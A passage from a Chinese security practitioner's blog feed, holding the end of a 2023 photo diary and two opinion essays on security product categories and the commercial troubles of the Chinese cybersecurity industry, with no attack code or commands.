id="目睹李哥四冠传说">目睹李哥四冠传说</h4><p><img src="https://blog.dvkunion.cn/img/a94615379125491eba685fcd7a34e3f3.png" alt="2023-11-19"></p><h2 id="十二月">十二月</h2><h4 id="圣诞月开启">圣诞月开启</h4><p><img src="https://blog.dvkunion.cn/img/bb182ec1eea04b748d2dbee639a7246d.png" alt="2023-12-02"></p><h4 id="从-92-加满到-95-加满">从 92 加满到 95 加满</h4><p><img src="https://blog.dvkunion.cn/img/107f4bfe435248039abb6c443a4ad2e5.png" alt="2023-12-15"></p><h4 id="《网易云年度报告》">《网易云年度报告》</h4><p><img src="https://blog.dvkunion.cn/img/d7ba87ccaa684a58bc89457b4c31b566.png" alt="2023-12-20"></p><h4 id="终于有自己的窝了～">终于有自己的窝了～</h4><p><img src="https://blog.dvkunion.cn/img/fa702007900b45ffb2c081469df3af3a.png" alt="2023-12-22"><br><img src="https://blog.dvkunion.cn/img/9a007b568e6b472a8c7cecda66c83b51.png" alt="2023-12-22"><br><img src="https://blog.dvkunion.cn/img/9a3a1799184647a1aaf4aaf06ef971aa.png" alt="2023-12-22"></p><h4 id="回到哈尔滨老家">回到哈尔滨老家</h4><p><img src="https://blog.dvkunion.cn/img/4f4d0f7ad25f4f5f924550c16e546064.png" alt="2023-12-24"><br><img src="https://blog.dvkunion.cn/img/c566856000ad40afad0eb3f2c6442a8c.png" alt="2023-12-24"><br><img src="https://blog.dvkunion.cn/img/379c4705ec804f608f38d7afaacb202d.png" alt="2023-12-24"></p><h4 id="你怎么知道我去和痛仰跨年了">你怎么知道我去和痛仰跨年了 :)</h4><p><img src="https://blog.dvkunion.cn/img/506882ff49004d159e6aec0d8e558f4c.png" alt="2023-12-31"></p><h2 id="明年的展望">明年的展望</h2><ol><li>少喝酒</li><li>实现第一条</li></ol><p><img src="https://blog.dvkunion.cn/img/3f2437e656b44fb197ae7fc54abd2456.png" alt="2024-01-01"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&amp;quot;感谢2023所有出镜人员&amp;quot;&lt;/h1&gt;
&lt;p&gt;赶在 2023 的尾巴补交上这一年的年度报告～&lt;/p&gt;
&lt;h2 id=&quot;一月&quot;&gt;一月&lt;/h2&gt;
&lt;h4 id=&quot;2023-年的开始是从-盖茨比-与我的举杯开始的。&quot;&gt;2023 年的开始是从 盖茨比 与我的举</summary>
      
    
    
    
    <category term="life" scheme="http://blog.dvkunion.cn/categories/life/"/>
    
    
    <category term="life" scheme="http://blog.dvkunion.cn/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>聊聊我对安全产品的思考和理解</title>
    <link href="http://blog.dvkunion.cn/2023/12/21/%E8%81%8A%E8%81%8A%E6%88%91%E5%AF%B9%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E7%9A%84%E6%80%9D%E8%80%83%E5%92%8C%E7%90%86%E8%A7%A3/"/>
    <id>http://blog.dvkunion.cn/2023/12/21/%E8%81%8A%E8%81%8A%E6%88%91%E5%AF%B9%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E7%9A%84%E6%80%9D%E8%80%83%E5%92%8C%E7%90%86%E8%A7%A3/</id>
    <published>2023-12-21T18:25:00.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>聊聊我对安全产品的思考和理解</h1><p>聊起这个话题是因为作为安全从业人员，对这样一个问题的思考：</p><!-- split --><blockquote><p>假如你作为一家公司的安全负责人，该如何进行安全建设？</p></blockquote><span id="more"></span><p>咋一看很像CSO级别考虑的问题，我们抛掉这个问题的宏观部分(毕竟还达不到这个级别T^T), 从实际落地与施行上考虑，作为安全人员，如何给一家想要提升安全级别的公司提出合理可靠的建议与建设方案呢？</p><h2 id="聊聊需求">聊聊需求</h2><img src="https://blog.dvkunion.cn/img/861703154474_.pic.jpg" style="width: 40%" /><p>昨天读完了赵武老师的<a href="https://mp.weixin.qq.com/s/Er6J3tJ4L6QyyT2wFBWtdA">《网安创业的核心竞争力是成本控制》</a>，里面提到了对国内安全市场的看法，特别的指出了了监管、金融、互联网等行业对安全需求与其他行业的不同。</p><blockquote><p>现在有两类客户是不同的，一类是监管用户，一类是金融互联网这样的企业。第一类好理解，网络安全问题跟地缘安全一样，最终都是国家买单，所以上层领导们总是急的，看到问题多，也想要解决，但是这么多环节，层层下达，效率总差强人意，同时下面捂被子的情况也是丝毫不见改善，越是这样越急，越急也就对技术要求不一样，一下就拉高了起来。另外金融和互联网离钱太近，网络安全问题几乎都会直接对应金钱的损失，所以有没有监管，都是自驱地选择更好或者更创新的方案。这些情况，安全公司自然都感受到了，不约而同地都往这些地方靠拢，除此之外，出海也无外乎这两种类型的客户。</p></blockquote><p>既然要进行安全建设，那么第一个要思考的问题就是：为什么要进行安全建设？</p><p>其实也可以理解为：我的需求到底是什么？</p><h3 id="I-硬性需求-法律">I.硬性需求: 法律</h3><img src="https://blog.dvkunion.cn/img/821703154472_.pic.jpg" style="width: 40%" /><p>想起来刚入行时的一个困惑，就是为什么企业明明被攻击了、被偷窃了数据，反而要遭到监管的处罚呢？当时的前辈给做了一个很形象的比喻：</p><blockquote><p>一家博物馆，开了一场珍贵的展出，展出了各位收藏家的珍品，但是由于没做任何安全防护、没有请任何安保措施，导致场厅内的展品都被偷了，此时警察应不应该处罚博物馆的负责人呢？</p></blockquote><p>同样的类比，在中心化的互联网架构中，各个服务商就是博物馆，而我们作为用户，各种个人信息就是我们的“珍品”，交到了服务商手中，服务商有责任和义务维护好其安全。</p><p>由此，国家变出台了《中华人民共和国网络安全法》、《信息系统安全等级保护基本要求》（GB/T 22239-2008）、《网络安全等级保护管理办法》 等法律法规，来要求企业和服务商进行安全防护。</p><p>但引用罗翔老师的一句话：</p><blockquote><p>“法律是对人最低的道德要求，如果一个人标榜自己遵纪守法，这个人完全有可能是人渣”</p></blockquote><p>等保只是法律所规定的最低标准，如果所有企业都仅以此为最终目标，那国内的安全就没有任何希望了。这里就更不要提连等保都不满足的一些场景还存在。</p><p>这里我说等保只是最低标准的意义，并不是实际指等保内的防护内容比较基本，实际上等级保护中的很多要求完全满足一些防护的最佳实践；但是大家懂得都懂，真实落地时候具体是怎样的、实际业务各种各样奇怪的网络需求导致真实的配置并不能完全按照等级保护所描述的那样配置；再加上计算机技术飞速迭代导致法律中所规定的一些服务技术栈已废弃不在使用、新技术的规范又没有及时加入等等因素，由此等保确实只能作为安全建设要求中的&quot;最低标准&quot;。</p><p>除了国家的等级保护，国际上还有很多其他的安全标准如：ISO-27001、ISO-27701等等，这类合规类证书的要求驱动了安全整体的基本建设；除此之外，这类认证也能快速的给用户在选择时提供一份安心的保证。</p><p>回到正题，这是安全的第一个需求：想要业务合法合规的运行，要满足国家等级保护法规。应之而生的安全服务有：等保检测、各类合规工具等等，来协助企业完成和通过等保检查。</p><h3 id="II-显性需求-损失">II.显性需求: 损失</h3><img src="https://blog.dvkunion.cn/img/841703154473_.pic.jpg" style="width: 40%" /><p>现在我们的企业已经拿到了各类安全认证，安全的建设就完成了吗？</p><p>业务刚刚上线，收到了运维的告警：服务不可用了，我们遭到了DDOS攻击。过一会又发现其中的几台核心机器，赫然出现了勒索信的字样：我们被勒索了。</p><p>由于仅仅做了等级保护中要求的部分，业务除此之外都属于“裸奔”的状态，很快遭到了各类攻击。其中能在感受上最直接、最明显的就为DDOS、勒索等直接的攻击了。</p><p>这类问题我把它称作显性需求，不想办法解决总有一天可能会爆炸，也是企业最容易理解、最愿意花钱买单的场景：毕竟是直接感受得到的问题，不处理服务无法使用、业务开展不下去的情形。</p><p>换句话说，真实的给企业带来了损失，能真让企业感受到了疼痛的问题，我都认为是属于这类需求；不论是一个短信认证接口被用于了短信炸弹导致服务账单超出了几百倍、还是机器上弱口令导致的勒索事件，这些想要解决的问题，都属于显性需求。</p><p>这类需求解释成本低，用户接受度高，毕竟真正涉及到了钱包，想必是能够接受和愿意付费的；和买了新车肯定也要买一份保险一样。</p><h3 id="III-隐性需求-规范">III. 隐性需求: 规范</h3><img src="https://blog.dvkunion.cn/img/881703154475_.pic.jpg" style="width: 40%" /><p>把显性需求比做得了病需要赶紧吃药的话，隐性需求则更像是一味中药：见效慢，但是是从病根子治起。</p><p>大家都知道中药好，但是在实际操作中，对待安全问题的态度往往还是和我们吃西药的态度一样：一个弱口令问题，改掉就好了，下次再出现再改；一个硬编码的密钥，禁用掉重新生成一个就好了，完全不考虑如何通过建设安全的规范和制度，让这类问题直接不会出现。</p><p>这确实是很困难的，大家也都知道多运动多健身就能少得病，但是真实做下来有多少能坚持下来的呢？</p><p>对应这类需求，比如SDLC、业务上线前的安全检测服务等等，我认为都属于这类，包括一些</p><p>没有他完全不耽误我挣钱，就是不知道什么时候会因为这点小毛病而生一场大病。</p><h3 id="IV-其他">IV. 其他</h3><img src="https://blog.dvkunion.cn/img/801703154467_.pic.jpg" style="width: 40%" /><p>为什么还有其他这一类呢？因为既然有了需求，自然而然就会有人来取满足这些需求；有了人，自然而然的就有生成了新的需求。</p><p>我把这类需求分化到其他的类别来，比如各类安全工具：burp、cs、yakit等等，服务于安全行业的人的一些工具和企业，也算做是安全行业的需求之一。</p><h2 id="安全的产品">安全的产品</h2><img src="https://blog.dvkunion.cn/img/871703154474_.pic.jpg" style="width: 40%" /><p>聊完了我认为的安全需求的划分，我们再来看看现在市面存在的安全解决方案和安全产品。继续我们上面的场景，按照给企业进行安全建设的思路来对这些安全产品进行划分。</p><h3 id="业务安全-应用安全">业务安全/应用安全</h3><p><strong>WAF</strong>: WAF可能是最常见的安全设备之一了，他的全程叫做：Web Application Firewall（网络应用防火墙），主要是防御web方向的攻击的(owasp top 10), 但随着业务的发展，对waf的期望和要求也越来越高，要求waf能够防护bot机器人流量、一定的抗ddos功能等等。</p><p><strong>RASP</strong>: RASP (Runtime Application Self-Protection)运行时应用程序自我保护，是一种应用程序安全技术和解决方案。RASP 技术旨在在应用程序运行时动态保护应用程序免受各种安全威胁和攻击, 不同于WAF, RASP 与应用程序代码紧密集成。它运行在应用程序的运行时环境中，能够实时监视和保护应用程序；而WAF更多的是针对已知的攻击进行拦截。</p><p><strong>风控类</strong>: 统一把各类风控产品作为了业务安全的一部分，包括但不限于内容审查、各类资质认证服务、黑灰产威胁等等，不再一一列举。</p><p><strong>网站监测</strong>: 这类产品主要应对与一些静态和官网，这类网站更新节奏慢、可访问性需求高，因此需要一款产品来对其进行监控，及时发现不可用的情况以及防止被挂黑页等等。</p><p><strong>DevSecOps</strong>: 软件开发生命周期（SDLC）是开发团队用来设计和构建高质量软件的高性价比、节省时间的过程。SDLC 的目标是通过前瞻性的规划将项目风险降到最低，从而使软件不论是在在生产过程中，还是长远而言都能满足客户的期望。此方法概述了将软件开发过程划分为可以分配、完成和度量的任务的一系列步骤。今天，大多数团队都认识到安全性是软件开发生命周期中不可分割的一部分。（from aws)</p><blockquote><p>我的理解，DevSecOps实际上解决的是整个开发流程的规范问题，包括代码质量、review机制、安全测试等等，当流程规范了，自然而然的可以从源头上减少安全问题的产生(理想上)。<br>目前市面上应对 DevSecOps 的产品有：<br>SAST: 静态应用程序安全测试，也就是我们常说的白盒扫描，通过静态分析研发代码，编写检测规则，对代码级别的安全问题进行审查。<br>DAST: 动态应用程序安全测试, 也称为黑盒测试。针对的是业务API接口信息，常见的漏扫就属于此类。<br>IAST: 交互式应用程序安全测试，也叫灰盒测试，结合了黑盒与白盒的优势，通过扫描与验证，能够更加准确进行告警。</p></blockquote><p><strong>SRC</strong>: 这个就不做多解释了。</p><h2 id="网络安全-基础安全-主机安全">网络安全/基础安全/主机安全</h2><p><strong>VPN</strong>: 解决员工异地连接内部网络的问题</p><p><strong>Firewall 防火墙</strong>: 传统网络流量监控和控制设备，以阻止未经授权的访问和恶意流量进入网络。</p><p><strong>IPS</strong>: IPS (入侵防护系统) 是一种网络安全设备，用于检测和阻止网络上的恶意流量和攻击。它可以分析流经网络的数据包，并根据已知的攻击模式进行拦截或报警。</p><p><strong>IDS</strong>: IDS（入侵检测系统）也是一种网络安全设备，用于检测网络中的恶意活动和攻击。与IPS不同，IDS 通常只报警，而不主动阻止流量。它监视网络流量以寻找异常行为。</p><p><strong>堡垒机</strong>: 堡垒机（Bastion Host）是一种用于增强网络安全性的特殊计算机系统或设备。其主要目的是控制和管理对内部网络的远程访问，以确保只有经过授权的用户才能进入敏感网络区域。以下是堡垒机的主要特点和功能：</p><p><strong>HIDS</strong>: HIDS（主机入侵检测系统）是一种安装在单个主机或服务器上的入侵检测系统，用于监视该主机的活动，以检测是否有恶意活动或入侵尝试。它关注主机级别的安全。</p><p><strong>EDR/XDR</strong>: EDR（终端 是一种安全解决方案，专注于监视和保护终端设备（如计算机和移动设备）。它用于检测和响应终端设备上的恶意活动和威胁。</p><p><strong>终端杀毒/终端控制</strong>: 指常见的办公电脑安装的杀毒软件，目标在于解决办公机器的运行安全</p><p><strong>蜜罐</strong>: 蜜罐（Honeypot）是一种安全技术，用于诱使恶意攻击者、黑客或病毒入侵者攻击虚拟或模拟的目标，从而帮助组织监视、检测和学习有关威胁行为的信息。蜜罐实际上是一种陷阱，旨在吸引潜在的攻击者，以便分析他们的攻击技巧、策略和意图。以下是蜜罐的主要特点和功能：</p><p><strong>零信任</strong>: 零信任安全（Zero Trust Security）是一种新型的安全策略，它不信任任何内部或外部用户或设备，并要求对所有访问进行身份验证和授权。</p><h3 id="安全运营">安全运营</h3><p><strong>SIEM</strong>: SIEM 是一种综合性安全解决方案，用于集中收集、分析和管理来自各种安全源的信息和事件，以检测和响应威胁。</p><p><strong>SOC</strong>: SOC (Security Operations Center) 安全运营中心是一个组织内部或外部的安全团队，专门负责监视、检测、分析和响应信息安全事件和威胁。SOC 的主要目标是保护组织的信息技术环境，确保系统和数据的安全性、完整性和可用性。</p><h3 id="数据安全">数据安全</h3><p><strong>DLP</strong>: DLP 是一种安全技术，旨在监视和防止敏感数据泄漏或不当使用。它可以检测和阻止数据在内部或外部传输时的风险。</p><h3 id="SaaS、安全服务、情报产物、其他等">SaaS、安全服务、情报产物、其他等</h3><p>这个模块也不做细拆分了，主要涵盖了一些人力的安全服务、渗透测试、安全培训、威胁情报等等等等，</p><p>还有一些更贴合行业分类的安全产品，如区块链安全中的合约审计、工控安全等等，与行业强贴合，了解的不是很多，因此在此处略过。</p><h2 id="最终">最终</h2><p>再回到最开始的问题，现在我们作为安全负责人，面对这么多的安全种类和产品，该如何进行选择才能实现我们的需求呢？</p><p>这又成为了一个头疼的问题，简单的按照层次来执行这样的策略：先解决显性问题，然后再解决隐性问题来实现持续的问题，好像市面的产品并没有哪一款可以按照这种模式来实现：上了waf能防勒索嘛？上了流量监控能抗ddos嘛？做了devsecops是不是就没漏洞了？</p><p>都需要我针对每一个小问题去进行大动干戈的设备部署、业务改造等等，最终可能解决的只是需求中的一小部分，而代价却往往是不菲的：昂贵的设备、高额的改造成本，最终落地的可能仅仅是不一定存在的安全攻击。</p><p>这可能也符合安全的背景：安全就是离散的、在不同领域每个点下需要不断深入才能达到效果的。安全厂商知道这一点</p><p>更何况，安全也是不断在对抗和迭代的与时俱进的赛道，今天的产品能否防御的住明天出现的新型攻击，都是一个未知数；最为用户，于此我要付出高额的代价，可能最终大家都会算清楚这笔账来。</p><p>因此我在思考，我想要一种怎样的安全产品？</p><p><strong>更精准、更细致、更专业、更简单的防护</strong></p><p>这一点其实最开始是在waf身上体现出的：拦截机器人请求、抗ddos这些需求到底是不是应该丢给waf的工作？</p><p>当然为了产品能卖出去，各家的做法都是，一股脑的塞进去，做就完了。</p><p>我个人认为，waf就应该起到一个拦截 or not 的角色，其他任何功能都应该独立组合，waf提供规范化的语言来让其他决策引擎调用，从而实现防护。</p><p>说白了，各类安全产品并没有形成一个完美的合作生态，能各个组件之间自然而然的就形成了联动：流量监测监控的异常 -&gt; 决策引擎识别研判 -&gt; waf自动封禁的场景永远成为了一个幻想乡，就算是同一家厂商的设备，都恨不得自己的产品一口气做完所有的事情：异常+研判+封禁。这就导致了在每个方面都无法做到最精致，而显得不够专业；同时给使用者也带来的很大的学习成本和使用困扰。</p><p>于安全人员而言，这样的划分也能够让其专精于自己研究的领域，而不会导致一个专精于如何实现快速拦截的工程师去考虑和研究如何设置内置策略而导致的精力分散。</p><p><strong>更便宜的花费</strong></p><p>如何制定商业模式，才能让安全从一个“奢侈”的行业印象转变为“人人都用得起的必备的”概念，可能是一个值得思考的问题。一旦我为了防御而花费的精力以及成本大于了我遭受攻击的损失，那裸奔永远都会是人的第一选择，除了部分资金雄厚以及不做不行的行业。</p><p>就好比让我父母去做体检，老人家总觉得去医院就要花上大笔大笔的钱，最终可能啥都没有检查出来，浪费钱；但如果体检一次的花费能够让更多的人接受，或是让更多的人认可这个价值，</p><p>至于如何平衡这个成本，可能是这个问题的最难点吧。</p><p><strong>更能够直接的贴合需求</strong></p><p>这个可能是我个人的一个幻想吧，但是经历过自己实际防御和对抗一些攻击的场景时，确实是一个深切的体会。</p><p>比如我的blog天天被一些脚本小子拿着扫描器扫，一个纯静态的页面根本不可能存在的问题，但是却占用了我的带宽和流量；我要为此上一整套的waf来防护吗？当然不，其实挂cdn+静态缓存就可以简单的解决我的需求。</p><p>诸如此类的场景，实际上用户的量级和事件的严重程度并没有达到天崩地裂的地步，安全的厂家却像医院一样做了一通拍片做了一堆检查后，最后开了一堆昂贵的药(waf)，还得吃上三个疗程，其实最后就是个小感冒而已。</p><p>当然这和我之前说的，简单的方案很可能是治标不治本的临时措施，很容易再次出现相同的问题；这可能也是安全难做切矛盾的所在吧。作为用户，我确实希望更简单有效直接的方法实现；而作为安全人员，完整的安全建设才是一个比较健康稳妥且长远的方案。</p><p><strong>去安全产品化</strong></p><p>既然已经提出了一堆不切实际的想法，不如再大胆一些，“去安全产品化”！</p><p>也有很多人已经提出过这个观点，安全实际上和医生一样是需要根据病情来对症下药的，不同的公司和企业技术栈和整体架构都有所不同，统一化的设备产品很可能最终导致的就是驴唇不对马嘴；用户也不知道该如何使用，发挥出这个产品的最大功能；因此，安全必定是“神医”策略：不需要众多的护士，只需要关键的一位神医一针见效即可。</p><p>所以，安全产品应该是做一些更小的问题：这类问题才是大家可能平时都会遇到的，像头疼脑热之类的，随手买包感冒灵解决的问题；被ssh暴力扫描了，我运行一个脚本改个端口好了，不需要夸张的搞一整套的入侵检测 + 数据大屏作展示；当然，如果有更好的脚本（更有效的药）来平替，比如敲门机制解决这个问题，当然是更好的。这样把整体的中心转移到不断琢磨如何设计机制和对抗当中。</p><hr><p>最后给出我对这个问题的回答：如何进行安全建设？</p><p>我的想法是，有病治病，没病就赶紧该吃吃该喝喝～</p><p>可能这就是我为啥做不了CSO的原因吧......(T^T)</p><img src="https://blog.dvkunion.cn/img/891703154475_.pic.jpg" style="width: 40%" /><h4 id="参考链接">参考链接</h4><blockquote><p>0.《网安创业的核心竞争力是成本控制》 : <a href="https://mp.weixin.qq.com/s/Er6J3tJ4L6QyyT2wFBWtdA">https://mp.weixin.qq.com/s/Er6J3tJ4L6QyyT2wFBWtdA</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;聊聊我对安全产品的思考和理解&lt;/h1&gt;
&lt;p&gt;聊起这个话题是因为作为安全从业人员，对这样一个问题的思考：&lt;/p&gt;
&lt;!-- split --&gt;
&lt;blockquote&gt;
&lt;p&gt;假如你作为一家公司的安全负责人，该如何进行安全建设？&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="essay" scheme="http://blog.dvkunion.cn/categories/essay/"/>
    
    
    <category term="随笔" scheme="http://blog.dvkunion.cn/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>安全的囚徒困境</title>
    <link href="http://blog.dvkunion.cn/2023/11/07/%E5%AE%89%E5%85%A8%E7%9A%84%E5%9B%9A%E5%BE%92%E5%9B%B0%E5%A2%83/"/>
    <id>http://blog.dvkunion.cn/2023/11/07/%E5%AE%89%E5%85%A8%E7%9A%84%E5%9B%9A%E5%BE%92%E5%9B%B0%E5%A2%83/</id>
    <published>2023-11-07T01:20:08.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>安全的囚徒困境</h1><hr><center><small>2023-11-07</small></center><!-- split -->"黑夜即将来临，你是愿意就此长眠，还是愿意和我一起，冰冷的守着下一个黎明?"<span id="more"></span><hr><h2 id="font-color-259d92-0x00-前言-font"><font color = "#259d92"> 0x00 - 前言 </font></h2><p>半夜睡不着, 翻来覆去的焦虑, 夜晚的失眠会导致第二天的昏昏欲睡, 继而影响第二天晚上的睡眠, 以此周而复始, 不断累加, 最终形成一个恶性的循环。</p><p>爬起来聊一聊最近的风声与我的一些想法吧。</p><h2 id="font-color-259d92-0x01-安全五大日常基础能力-font"><font color = "#259d92"> 0x01 - &quot;安全五大日常基础能力&quot; </font></h2><p>2023年接近尾声，各<a href="https://mp.weixin.qq.com/s/RI3XX8veXirLfxe6e1qv0g">安全公司的财报</a>与裁员消息接踵而至, 哀声一片, 响彻脉脉。</p><p>同时也看到这了这个么一个词, &quot;安全五大日常基础能力&quot;, 结果硬是刷到了现在也不知道这五大日常到底是什么.....</p><p>但是也能猜到了个大概吧，比如对领导的吹嘘，对客户的哄骗, 对行业热词侃侃而谈之类等等，应该不是什么褒义词。</p><p>随着今年疫情的结束, 整个世界并没有像着预期的欣欣向荣发展, 反而却背道而驰；楼市掉价，各个行业低落，失业潮一波接着一波......</p><p>寒冬这个词好像已经不是23年出现的了，但是感觉每一年都要被提及，且一年寒冷于一年。</p><p>整体的经济下行伴随着的，是讨论如何&quot;消费降级&quot;，是如何额&quot;降本增效&quot;。而对于这个本来就有一部分人不看好的安全，在这个寒冬中，过的更是尤为惨烈。</p><p>其实早些年听到各种负面行情消息时我还是不屑一顾的态度，直到真正赤裸裸的数字和现实摆在面前时，同届的安全朋友消失在圈子时，还在坚持的朋友抱怨要放弃了转行时，才意识到可能真的出现了一些问题。</p><p>再回过头来看，整个安全行业好似已经遍体鳞伤。</p><h2 id="font-color-259d92-0x02-为了挖洞而挖洞-font"><font color = "#259d92"> 0x02 - &quot;为了挖洞而挖洞&quot; </font></h2><p><img src="https://blog.dvkunion.cn/img/141699275181_.pic_hd.jpg" alt=""></p><p>故事的起因来自于一篇偶然刷到的安全公众号文章，去除多余的截图和心路历程，总结一下:</p><blockquote><p>挖src的漏洞时，发现了一个信息泄露，内容是账户的手机号，和加密的密码，密码解密失败，放弃，至此提交了src，src收录给了4分，整个事件结束。</p></blockquote><p>在看完整个文章时心情其实很复杂, 没有像读到《js代码泄漏》的漏洞报告时的轻松愉悦的态度, 也没有像被提问到《SBCVE为什么无法扫出》时的愤怒与不甘, 我也不知道该如何形容这样一种的感觉。</p><p>这也是为什么突然对现在的一些公众号的文章越来越疲惫的原因，大部分的内容整齐划一：</p><ul><li>夸张的标题：某某某集团/学院/医院/政府 RCE/百万数据/xxx</li><li>模糊的漏洞界面截图（为了脱敏）。</li><li>弱口令、已知1day、扫描器批量扫描打出来的入口点。</li><li>成功登陆后台（这步必须有）。</li><li>浅显的数据危害证明、打码的大量数据截图。</li><li>有一些会批量跑一些内网工具和脚本作横向移动，大部分src止步于口子，给一个src禁止内网这种的扩散行为的理由，也可能其他的因素。</li><li>最后给出价值证明，可能是奖金，可能是HVV评分，再就是感谢证书。</li></ul><p>作为一个安全工程师，他可以在完全不清楚这个网络拓扑、整体架构、技术栈、部署逻辑的情况下，发现这样一个问题。</p><p>我一直不明白为什么会对这个文章耿耿于怀，而不能像面对&quot;js代码泄漏&quot;和&quot;苕皮哥&quot;这样的事情时一笑而过做个吃瓜群众，也不能像遇到一些弱鸡CVE时破口大骂一通。</p><p>直到今天突然意识过来，不是因为他这样的内容配上一个培训卖课的二维码，也不是因为过水的内容浪费了我的时间。</p><p><font color = "#259d92">而是对安全行业的悲哀。</font></p><p>早期做安全服务的时候，很多师傅在乌云精彩的src挖掘文章在渗透测试工作中起到了一个思路上的指点：也培养了后期对一些api设计、api接口和数据的敏感程度。</p><p>为什么早期的文章精彩? 因为文章的内容、利用手段、参数构造、api信息、响应格式、逻辑判断、信息利用等等方面，每一篇文章都能够让你有所收获。<br>而师傅们挖漏洞，也不是在硬拿着漏洞模版和漏洞报告往应用服务上贴，真真正正的是在与开发/测试的人员进行思维上的对抗。打赢了，便是漏洞。</p><p>反观过来，模版一样的文章更映射出众多src的弊端: 为了证明/业绩，我必须要有漏洞，必须要有足够数量的漏洞。</p><p>也突然联想到，在哪里看到的老研发吐槽现在的安全工程师：</p><blockquote><p>业务没摸清，代码也不懂，张嘴就要修复，工单响应晚了直接滴滴领导</p></blockquote><p>现在的安全，像极了小学里的那个纪律委员，正和班主任报道着这周在课上说话的几个坏学生。</p><p>以及前阵子freebuf发的文章<a href="https://www.freebuf.com/articles/container/377477.html">请先理解了云原生再谈容器安全</a>，我觉得不仅仅云原生安全需要，同样适用于安全的各个分类。</p><p>做web安全没看过tomcat、django; 做病毒的没绕过沙盒......</p><p>这就好比原始社会与现代社会：在原始时代，你可以说不会语言不懂文字，只要能够捕到猎物，能活下去，就能生存，成为部落之王；而到了现代社会，只会捕猎甚至可能很难在这个世界存活。</p><p>早期国内的安全确实可能只需要了解什么是漏洞，怎么挖掘漏洞就可以了。但是当这一步已经实现了之后，就好比原始社会实现了温饱，下一步要准备迈入石器时代。</p><p>自然而然的，作为应代的安全工程师，有理由要求你要了解开发，了解业务，站在了解的角度之上，提出的才是安全建议；<strong>中国的安全已经不是需要遍地赤脚医生的时代了，不是对着任何病症都开一方药草就了事的情形了</strong>。需要你真正的对每一个病症有详细的了解，有丰富的经验，才能够面对各种各样的病人游刃有余，有效的&quot;看病&quot;。</p><p>回到这个src的文章，我不会对信息泄露/越权/弱口令等老式 top 10 问题嗤之以鼻，更不会否定这几百万的数据价值；而令我遗憾的是，那串没有被解密的密码，没有被攻破的内网，被忽略未探测的接口，被遗忘的安全测试，以及src那可笑的4分。</p><h2 id="font-color-259d92-0x03-安全的囚徒困境-font"><font color = "#259d92"> 0x03 - &quot;安全的囚徒困境&quot; </font></h2><p><img src="https://blog.dvkunion.cn/img/218381298f381d458f63154af470d145_b.jpg" alt="你要当一辈子的懦夫, 还是英雄, 哪怕只有几分钟"></p><p>囚徒困境（prisoner's dilemma）是指两个被捕的囚徒之间的一种特殊博弈，说明即使合作对双方都有利时，保持合作也是困难的。囚徒困境是博弈论的非零和博弈中具代表性的例子，反映个人最佳选择并非团体最佳选择。虽然困境本身只属模型性质，但现实中的价格竞争、环境保护、人际关系等方面，也会频繁出现类似情况。<a href="https://baike.baidu.com/item/%E5%9B%9A%E5%BE%92%E5%9B%B0%E5%A2%83/5739141?fr=ge_ala">[百度百科]</a></p><p>简单的描述一下原始的囚徒困境：两个共谋犯罪的人被关入监狱，不能互相沟通情况。如果两个人都不揭发对方，则由于证据不确定，每个人都坐牢一年；若一人揭发，而另一人沉默，则揭发者因为立功而立即获释，沉默者因不合作而入狱十年；若互相揭发，则因证据确凿，二者都判刑八年。</p><p>那么假设你是这个囚徒，你该如何选择?</p><p>回到标题, 从一篇文章看到整个行业，安全正面临着囚徒困境。</p><p>我们把囚徒困境的模型换到安全行业中：假设所有的安全公司都是一个个的&quot;囚徒&quot;，真实的攻击则是&quot;审讯官&quot;，面对仅有且可能越来越小（大公司自研，小公司忙着活下去）的市场（类比困境中的三种惩罚），各家公司能做到&quot;互不揭发&quot;从而实现共赢吗?</p><p>答案大概率是消极的。所有人都会朝着&quot;释放&quot;那一丁点希望，期盼着自己是那一个幸运者，从而放弃选择&quot;一年牢&quot;的可能。最终的结果就是，行业毁灭，大家一起坐上八年大牢。</p><p>聊到这里，就不得不再提一下所谓的&quot;揭发&quot;。这也是国安全内目前最大的痛苦。</p><p>囚徒困境最大的问题在于，囚犯之间不能互相沟通。因此囚犯会担心自己沉默而被对方指认，所以国内的安全公司全部的精力都放在了，如何&quot;有效的揭发&quot;另一家安全公司，从而避免自己坐牢而对方过上了（财务）自由的生活。</p><p>而对比国外的众多安全厂家，为何能呈现一股欣欣向荣之势? 因为他们的关注点永远都是在于，如何与&quot;审讯官&quot;进行对抗? 如何能够瞒过&quot;审讯官&quot;，或是如何能够与伙伴沟通一起瞒过&quot;审讯官&quot;。</p><p>另一个痛苦的点在于，这种局势就像是温水煮青蛙一般，没有看得到的破局之势。</p><p>今日A厂商为了证明比B厂商产品更有价值，硬加入了100多条安全策略规则，在下一次的竞争中作为标书检查项来碾压对方，而不管这100条策略是不是真的安全风险；明日B厂商快速抄了A厂商的规则，追平&quot;安全能力&quot;，还反手添了一个&quot;数据大屏&quot;。打的不亦乐乎。</p><p>这么下去，已经没有人在意真正的安全与否了，不过都是敛财的产品，变了形状的金砖罢了，至少目前还像是块金子。</p><p>但是又不得不这样下去，否则就会是那个沉默的囚徒，被另外的人告发而无法生存下去，如果都无法活下去了，其他的就更没意义了。</p><p>在这样劣币竞选的大环境下，也难怪安全会被看衰。把中国的网络安全与保安行业类比一下就好了：</p><ul><li>以前需要的都是身强体状身手敏捷的保安，现在便宜就行。（法制社会像小区这种没强需求谁会给你雇个年轻力壮的小伙? 老大爷一样看门）</li><li>以前的保安可能需要从小练功，但到了勇武时只需会打拳即可；现在的保安面试需要学会刀枪棍棒，工作时最后坐在板凳上喝茶养神。</li><li>以前的保安都是服务于雇主，现在保安都是爷，权限极高。（开发都是弟弟，安全都是大哥）</li><li>不多比喻了，号该没了。</li></ul><p>如何拯救现在安全在大众眼中好似保险一样诈骗行业的印象，是属于各个安全厂商的囚徒困境。</p><h2 id="font-color-259d92-0x04-谁动了我的奶酪-font"><font color = "#259d92"> 0x04 - &quot;谁动了我的奶酪?&quot; </font></h2><p><img 